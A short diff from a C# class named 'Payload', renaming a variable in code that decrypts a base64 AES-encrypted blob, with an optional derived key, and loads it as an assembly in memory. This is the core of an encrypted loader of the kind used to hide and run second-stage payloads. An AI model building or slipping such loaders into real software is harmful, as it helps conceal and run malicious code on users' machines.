@@ -168,17 +168,17 @@ public class Payload
 
             byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);
 
-            byte[] aesKey;
+            byte[] key;
             if (KEYING.Length > 0)
-                aesKey = DeriveKey(SALT_B64, KEYING);
+                key = DeriveKey(SALT_B64, KEYING);
             else
-                aesKey = Convert.FromBase64String(KEY_B64);
+                key = Convert.FromBase64String(KEY_B64);
             byte[] iv = Convert.FromBase64String(IV_B64);
 
             byte[] clearAssembly;
             try
             {
-                clearAssembly = AesDecrypt(encrypted, aesKey, iv);
+                clearAssembly = AesDecrypt(encrypted, key, iv);
             }
             catch (CryptographicException)
             {
@@ -187,7 +187,7 @@ public class Payload
             }
 
             Array.Clear(encrypted, 0, encrypted.Length);
-            Array.Clear(aesKey, 0, aesKey.Length);
+            Array.Clear(key, 0, key.Length);
             Array.Clear(iv, 0, iv.Length);
 
             Assembly asm = Assembly.Load(clearAssembly);
